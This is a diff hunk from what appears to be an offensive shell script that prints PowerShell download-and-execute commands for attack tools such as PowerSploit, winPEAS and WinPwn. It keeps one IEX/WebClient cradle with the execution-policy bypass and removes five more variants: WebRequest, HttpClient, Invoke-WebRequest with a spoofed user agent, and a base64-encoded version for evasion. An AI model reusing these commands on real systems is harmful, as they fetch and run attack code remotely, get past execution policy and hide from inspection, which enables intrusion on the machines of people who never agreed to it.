@@ -66,23 +66,6 @@ for script in powersploit.ps1 winpeas.ps1 winpwn.ps1; do
     
     # Method 1: Standard IEX with WebClient
     print_command "powershell -nop -exec bypass -c \"IEX((New-Object Net.WebClient).DownloadString('$url'))\""
-    
-    # Method 2: WebClient without IEX
-    print_command "powershell -nop -exec bypass -c \"(New-Object Net.WebClient).DownloadString('$url') | IEX\""
-    
-    # Method 3: System.Net.WebRequest (corrected)
-    print_command "powershell -nop -exec bypass -c \"\$r=[System.Net.WebRequest]::Create('$url');[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;\$r.Headers.Add('User-Agent','Mozilla/5.0');\$r.Proxy=\$null;\$result=\$r.GetResponse().GetResponseStream();IEX(([System.IO.StreamReader]::new(\$result)).ReadToEnd())\""
-    
-    # Method 4: HttpClient (newer PowerShell versions)
-    print_command "powershell -nop -exec bypass -c \"\$c=New-Object Net.Http.HttpClient;\$c.DefaultRequestHeaders.Add('User-Agent','Mozilla/5.0');IEX(\$c.GetStringAsync('$url').Result)\""
-    
-    # Method 5: Invoke-WebRequest
-    print_command "powershell -nop -exec bypass -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(Invoke-WebRequest -Uri '$url' -UseBasicParsing).Content\""
-    
-    # Method 6: Base64 encoded
-    encoded_command=$(echo "IEX((New-Object Net.WebClient).DownloadString('$url'))" | iconv -t utf-16le | base64 -w 0)
-    print_command "powershell -nop -exec bypass -enc $encoded_command"
-    
     echo
 done
 
